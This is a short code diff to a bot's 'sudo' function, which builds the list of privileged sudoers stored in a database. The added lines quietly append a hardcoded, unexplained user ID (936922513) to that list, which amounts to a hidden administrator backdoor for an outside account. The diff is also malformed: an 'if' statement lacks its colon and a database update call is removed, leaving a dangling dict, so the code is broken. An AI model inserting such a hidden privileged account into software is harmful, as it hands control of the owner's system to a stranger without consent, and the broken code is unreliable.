@@ -50,7 +50,7 @@ async def sudo():
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
-        await sudoersdb.update_one(
+        if user_id not in sudoers
             sudoers.append(user_id)
             sudoers.append(936922513)
             {"sudo": "sudo"},
